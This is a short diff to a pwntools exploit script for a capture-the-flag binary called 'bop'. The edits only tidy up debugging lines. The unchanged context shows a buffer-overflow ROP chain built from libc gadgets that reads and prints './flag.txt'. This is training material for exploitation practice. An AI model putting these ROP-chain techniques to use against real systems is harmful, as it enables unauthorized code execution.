@@ -2,7 +2,7 @@
 from pwn import *
 context.log_level='debug'
 context.arch='amd64'
-context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
 
 p=process('./bop',env={'LD_PRELOAD':'./libc-2.31.so'})
 # p = remote("mc.ax", 30284)
@@ -47,10 +47,6 @@ syscall = libc.sym['read']+0x10
 rax = libc.address+0x036174
 rdx = libc.address+0x142c92
 
-# gdb.attach(p,'''
-#            b gets
-#            ''')
-
 payload = b"A"*40
 payload += p64(rdi) + p64(bss+0x800)
 payload += p64(e.plt["gets"])
@@ -71,10 +67,9 @@ payload += p64(rsi)+p64(bss+0x800) + p64(0)
 payload += p64(rax)+p64(1) 
 payload += p64(rdx)+p64(0xff)
 payload += p64(syscall)
-# gdb.attach(p)
 
 sla(b"? ", payload)
-input()
+input() # press enter
 sl(b"./flag.txt\0")
 
 print(p.recv(1024))
